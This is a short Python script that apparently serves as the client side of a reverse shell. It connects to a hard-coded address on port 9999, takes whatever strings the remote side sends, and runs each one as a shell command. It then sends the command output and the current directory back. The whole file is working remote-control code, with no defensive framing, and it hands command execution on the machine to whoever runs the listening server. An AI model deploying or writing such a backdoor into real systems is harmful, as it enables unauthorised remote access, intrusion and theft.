import os
import socket
import subprocess

s = socket.socket()
host = '192.168.0.8'        # Change the port number to server's port number
port = 9999
s.connect((host, port))

while True:
    data = s.recv(2048)

    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))

        # Show the client what you are doing.
        print(output_str)

# Close connection
s.close()
